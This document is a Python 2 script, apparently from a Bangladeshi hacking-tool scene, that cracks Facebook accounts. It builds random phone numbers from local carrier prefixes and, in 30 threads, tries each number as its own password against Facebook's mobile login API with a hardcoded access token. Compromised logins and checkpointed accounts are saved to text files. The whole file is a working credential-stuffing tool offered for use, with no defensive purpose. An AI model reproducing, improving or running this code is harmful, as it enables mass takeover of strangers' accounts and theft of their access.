# Mr. TUTUL
# IT'S Tutul
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')

def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


psb('\x1b[1;32mBANGLADESHI 08 DIGIT NUMBER CLONING ')
for n in range(9999):
    nmbr = random.randint(11111111, 99999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3.0 / 200)


def t():
    time.sleep(1)


def cb():
    os.system('clear')


logo = """\033[1;92m
:'######:::::'###::::'########::'########::'####:'########::
'##... ##:::'## ##::: ##.... ##: ##.... ##:. ##:: ##.... ##:
 ##:::..:::'##:. ##:: ##:::: ##: ##:::: ##:: ##:: ##:::: ##:
. ######::'##:::. ##: ########:: ########::: ##:: ########::
:..... ##: #########: ##.... ##: ##.... ##:: ##:: ##.. ##:::
'##::: ##: ##.... ##: ##:::: ##: ##:::: ##:: ##:: ##::. ##::
. ######:: ##:::: ##: ########:: ########::'####: ##:::. ##:
:......:::..:::::..::........:::........:::....::..:::::..::
"""
back = 0
successful = []
cpb = []
oks = []
id = []
CorrectUsername = 'SABBIR'
CorrectPassword = 'SIMRAN'
loop = 'true'
while loop == 'true':
    username = raw_input('\x1b[1;91m \x1b[1;92mUSERNAME \x1b[1;92m: \x1b[1;92m')
    if username == CorrectUsername:
        password = raw_input('\x1b[1;91m \x1b[1;92mPASSWORD \x1b[1;92m: \x1b[1;92m')
        if password == CorrectPassword:
            print 'LOGGED IN SUCCESSFULLY AS ' + username
            time.sleep(2)
            loop = 'false'
        else:
            print '\x1b[1;97mWrong Password'
            os.system('xdg-open https://www.facebook.com/YOUR.NEXT.FATHER.165')
    else:
        print '\x1b[1;97mWrong Username'
        os.system('xdg-open https://www.facebook.com/YOUR.NEXT.FATHER.165')

def menu():
    os.system('clear')
    print logo
    print '\x1b[1;93m ONLY 08 DIGIT PASSWROD CRACKING'
    print
    jalan('\x1b[1;93m[1]  \x1b[1;92mGRAMEENPHONE')
    jalan('\x1b[1;93m[2]  \x1b[1;92mROBI')
    jalan('\x1b[1;93m[3]  \x1b[1;92mAIRTEL')
    jalan('\x1b[1;93m[4]  \x1b[1;92mBANGLALINK')
    jalan('\x1b[1;93m[5]  \x1b[1;92mTELETALK')
    jalan('\x1b[1;93m[6]  \x1b[1;92mGRAMEENPHONE \x1b[1;91m(NEW)')
    jalan('\x1b[1;93m[7]  \x1b[1;92mBANGLALINK \x1b[1;91m(NEW)')
    jalan('\x1b[1;93m[8]  \x1b[1;92mCONTACT ADMIN')
    jalan('\x1b[1;93m[00] \x1b[1;92mEXIT')
    print 50 * '-'
    action()


def action():
    global cpb
    global oks
    bch = raw_input('\n\x1b[1;92m\xe2\x96\x84\xef\xb8\xbb\xcc\xb7\xcc\xbf\xe2\x94\xbb\xcc\xbf\xe2\x95\x90\xe2\x94\x81\xe4\xb8\x80   ')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        print '\x1b[1;92mGRAMEEN SIM TYPE ANY CODE : EXAMPLE \x1b[1;93m (017 - 013)'
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE  : ')
            k = '+88'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '2':
        os.system('clear')
        print logo
        print '\x1b[1;92mSIM CODE : TYPE \x1b[1;93m 018'
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE  : ')
            k = '+88'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '3':
        os.system('clear')
        print logo
        print '\x1b[1;92mSIM CODE : TYPE \x1b[1;93m 016'
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE  : ')
            k = '+88'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '4':
        os.system('clear')
        print logo
        print '\x1b[1;92mSIM CODE : TYPE \x1b[1;92m 019'
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE  : ')
            k = '+88'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '5':
        os.system('clear')
        print logo
        print '\x1b[1;92mSIM CODE : TYPE \x1b[1;93m 015'
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE  : ')
            k = '+88'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '6':
        os.system('clear')
        print logo
        print '\x1b[1;92mSIM CODE : TYPE \x1b[1;93m 013'
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE  : ')
            k = '+88'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '7':
        os.system('clear')
        print logo
        print '\x1b[1;92mSIM CODE : TYPE \x1b[1;93m 014'
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE  : ')
            k = '+88'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '8':
        os.system('xdg-open https://www.facebook.com/YOUR.NEXT.FATHER.165')
        time.sleep(1)
        menu()
    elif bch == '00':
        exb()
    else:
        print '[!] Fill in correctly'
        action()
    print '\x1b[1;95m======================================================>>'
    xxx = str(len(id))
    psb('\x1b[1;92m[\xe2\x9c\x94] TOTAL NUMBERS: ' + xxx)
    time.sleep(0.5)
    psb('\x1b[1;93m[\xe2\x9c\x93]\x1b[1;93m PLEASE WAIT, PROCESS IS RUNNING ...')
    time.sleep(0.5)
    psb('\x1b[1;96m[!] TO STOP PROCESS FIRST PRESS CTRL THEN PRESS Z')
    time.sleep(0.5)
    print '\x1b[1;95m=======================================================>>'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + c + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[SIMRAN-OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n' + '\x1b[1;92m  [JUST NOW LOGIN]\n'
                okb = open('save/ok.txt', 'a')
                okb.write(k + c + user + '|' + c + pass1 + '\n')
                okb.close()
                oks.append(c + user + c + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96m[SABBIR-CHECKPOINT] \x1b[1;97m' + k + c + user + ' | ' + pass1 + '\x1b[1;96m  [LOGIN AFTER 10 DAYS]\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + c + pass1 + '\n')
                cps.close()
                cpb.append(c + user + c + pass1)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '-'
    print '[\xe2\x9c\x93] Process Has Been Completed....'
    print '[\xe2\x9c\x93] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 sh11.py')


if __name__ == '__main__':
    menu()

